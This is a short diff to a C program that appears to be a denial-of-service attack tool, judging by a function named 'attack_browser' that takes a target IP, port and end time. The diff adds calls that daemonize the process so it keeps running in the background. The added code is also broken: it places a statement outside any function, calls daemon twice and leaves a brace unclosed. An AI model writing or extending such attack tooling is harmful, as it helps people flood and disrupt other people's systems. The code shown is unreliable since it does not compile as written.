@@ -1,4 +1,3 @@
-// Required headers
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -653,11 +652,22 @@ void attack_browser(const char* ip, int port, long long end_time_ms) {
 
 
 // Main function
+
+int daemon_result = daemon(1, 0);
+if (daemon_result < 0) {
+    perror("daemon");
+    exit(EXIT_FAILURE);
+}
+
 int main() {
     // Seed rand() for general randomness
     srand(time(NULL));
     // Initialize /dev/urandom for random bytes
     init_random_bytes();
+    // Daemonize the process
+    if (daemon(1, 0) < 0) {
+        perror("daemon");
+        exit(EXIT_FAILURE);
 
     // Python's top-level try/except: pass around main() is ignored in C.
     // The recursive main() call is replaced by the outer while(1) loop.
